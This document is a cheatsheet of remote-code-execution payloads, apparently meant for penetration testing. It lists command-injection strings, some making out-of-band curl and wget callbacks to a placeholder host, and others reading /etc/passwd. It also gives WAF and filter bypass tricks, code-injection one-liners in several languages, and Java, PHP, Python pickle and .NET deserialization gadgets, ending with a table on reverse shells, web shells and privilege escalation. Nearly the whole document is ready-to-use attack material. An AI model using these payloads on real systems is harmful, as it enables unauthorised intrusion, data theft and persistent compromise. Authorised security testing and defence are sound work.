# RCE — Payload Cheatsheet

## Detection Payloads

### Command Injection
```bash
# Blind detection (time-based)
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& ping -c 5 127.0.0.1 &

# OOB detection (callback)
; curl http://{collaborator}
| wget http://{collaborator}
`nslookup {collaborator}`
$(curl http://{collaborator})

# Inline result
; id
; whoami
| cat /etc/passwd
```

### OS-Specific
```bash
# Linux
;id
|cat /etc/passwd
$(uname -a)

# Windows
& whoami
| type C:\windows\win.ini
$(hostname)
& dir C:\
```

### Bypass Patterns
```bash
# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'cat\x20/etc/passwd'&&$X
cat</etc/passwd

# Keyword bypass
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
/???/??t /???/??????  (glob)

# Quote bypass
echo ${PATH:0:1}etc${PATH:0:1}passwd

# Semicolon/pipe bypass
%0aid  (newline)
%0a%0did  (CRLF)
```

### Code Injection (eval/exec contexts)
```python
# Python
__import__('os').system('id')
eval(compile('import os;os.system("id")','','exec'))

# PHP
system('id');
passthru('id');
exec('id');
shell_exec('id');
popen('id','r');

# Node.js
require('child_process').exec('id')
eval("require('child_process').execSync('id').toString()")

# Ruby
system('id')
exec('id')
`id`
%x(id)

# Java (Runtime.exec)
Runtime.getRuntime().exec("id")
```

## Deserialization RCE

### Java
```
# Detect: base64-encoded rO0AB (Java serialized object)
# Tools: ysoserial, marshalsec
# Common gadgets: CommonsCollections, Spring, BeanShell
java -jar ysoserial.jar CommonsCollections1 'curl {collaborator}' | base64
```

### PHP
```php
# Detect: serialized format a:1:{s:...}
# Dangerous functions: unserialize(), __wakeup(), __destruct()
O:8:"Classname":1:{s:4:"prop";s:6:"system";}
```

### Python (pickle)
```python
# Detect: base64 that starts with gASV or \x80
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ('curl {collaborator}',))
pickle.dumps(RCE())
```

### .NET
```
# Detect: VIEWSTATE, base64 with AAEAAAD
# Tools: ysoserial.net
ysoserial.net -g TypeConfuseDelegate -f Json.Net -c 'whoami'
```

## Validation Criteria

1. Command output visible in response OR OOB callback received
2. Arbitrary command (not just specific commands)
3. Demonstrate user context (id/whoami output)
4. Works through WAF/application layer

## Impact Escalation

| Impact | What to demonstrate |
|--------|-------------------|
| User context | whoami output showing the running user |
| File read | cat /etc/passwd or equivalent |
| Reverse shell | Establish callback connection |
| Persistence | Web shell or cron job placement |
| Privilege escalation | sudo -l, SUID binaries, kernel exploits |
| Lateral movement | Internal network access from compromised host |
